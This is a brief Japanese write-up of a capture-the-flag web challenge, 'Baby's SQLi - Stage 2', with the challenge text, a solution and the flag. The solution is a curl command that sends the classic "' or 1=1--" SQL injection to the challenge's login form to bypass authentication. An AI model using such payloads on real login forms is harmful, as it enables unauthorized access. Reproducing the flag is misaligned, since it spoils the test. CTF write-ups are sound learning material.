# Q24.[Web]Baby's SQLi - Stage 2-
うーん，ぱろっく先生深くまで逃げ込んでたか．
そこまで難しくは無いと思うんだけども……．

えっ？何の話か分からない？
さてはStage 1をクリアしてないな．
待っているから，先にStage 1をクリアしてからもう一度来てね．

Caution: sandbox.spica.bzの80,443番ポート以外への攻撃は絶対にしないようにお願いします．


## Solution

ログインフォームを利用して不正にアクセスし、Flagを取得する問題。
パスワードを推測してBruteForceで解いても良いが、ユーザー名がそもそも`porisuteru`なのかは判定できない。
SQL Injectionでログイン処理をバイパスできないか試してみるとFlagが取得できた。


```
curl -X POST --data-urlencode "n=' or 1=1--" -d 'p=password'  https://ctf.spica.bz/baby_sql/stage2_7b20a808e61c8573461cf92b1fe63b3f/
```

## Answer
cpaw{p@ll0c_1n_j@1l3:)}